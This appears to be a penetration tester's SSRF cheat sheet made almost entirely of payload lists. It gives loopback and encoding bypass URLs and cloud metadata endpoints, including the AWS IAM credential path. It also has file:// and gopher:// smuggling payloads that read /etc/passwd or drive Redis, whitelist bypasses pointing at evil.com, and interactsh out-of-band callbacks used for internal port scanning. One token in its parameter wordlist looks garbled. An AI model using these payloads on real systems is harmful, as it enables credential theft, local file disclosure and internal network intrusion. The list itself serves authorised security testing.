# SSRF Reference — payloads, bypasses, cloud endpoints

## Parameter wordlist (SSRF-prone)
```
url uri link src href file doc document path page site html image img media
video audio redirect redirect_to redirecturl redir next continue return ret
returnurl to target callback webhook hook proxy load fetch fetch_url import
feed rss api endpoint host domain ip address server data u nav goto open
srcdoc remote source base ref preview thumbnail avatar photo picture resource
ow2v5smg0tvlurl rurl external q srcpage view window frame siteurl pageurl
```

## Localhost / loopback bypasses
```
http://127.0.0.1/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://127.1/
http://127.0.0.1.nip.io/
http://0/
http://0x7f000001/            (hex 127.0.0.1)
http://2130706433/            (decimal 127.0.0.1)
http://0177.0.0.1/            (octal)
http://[::ffff:127.0.0.1]/
http://localtest.me/
http://127.0.0.1.sslip.io/
http://customer.packrepo.com@127.0.0.1/
http://127.0.0.1.             (trailing dot)
http://127.0.0.1%00.example.com/
```

## Cloud metadata (IMDS) — critical targets
```
AWS      http://169.254.169.254/latest/meta-data/
AWS role http://169.254.169.254/latest/meta-data/iam/security-credentials/
AWS token http://169.254.169.254/latest/api/token  (PUT, X-aws-ec2-metadata-token-ttl-seconds)
GCP      http://169.254.169.254/computeMetadata/v1/?recursive=true   (Metadata-Flavor: Google)
Azure    http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Metadata: true)
DigitalOcean http://169.254.169.254/metadata/v1.json
Oracle   http://169.254.169.254/opc/v1/instance/
Alibaba  http://100.100.100.200/latest/meta-data/
```

## Scheme smuggling (depends on fetch lib)
```
file:///etc/passwd
file:///proc/self/environ
dict://127.0.0.1:11211/stat
gopher://127.0.0.1:6379/_<redis cmd>
ftp://127.0.0.1:21/
ldap://127.0.0.1:389/
```

## Whitelist-bypass tricks
```
http://[REDACTED_EMAIL]/
http://allowed.com/evil.com
http://allowed.com.evil.com/
https://[REDACTED_EMAIL]/
http://[email protected]/
```

## Encoding / obfuscation
```
127.0.0.1   -> 127%2e0%2e0%2e1
127.0.0.1   -> %31%32%37%2e%30%2e%30%2e%31
http://127.0.0.1/  ->  http:/\\127.0.0.1/   (backslash)
double URL-encode the dots/bytes
```

## Blind confirmation (OOB)
- interactsh: `interactsh-client`  -> gives <id>.interact.sh
- inject `http://<id>.interact.sh/` then watch DNS + HTTP.
- Burp Collaborator: same concept, poll for interactions.
- For port scan: `http://<id>.interact.sh:PORT` per port.

## Tools
- Burp Suite + Collaborator
- interactsh (github projectdiscovery/interactsh)
- SSRFmap (swisskyrepo/SSRFmap) — auto exploit chains
- Gopherus (tarruda/gopherus) — gopher payloads for Redis/FastCGI/MySQL
- oralys / fuzz.txt param lists
- Caido / ZAP
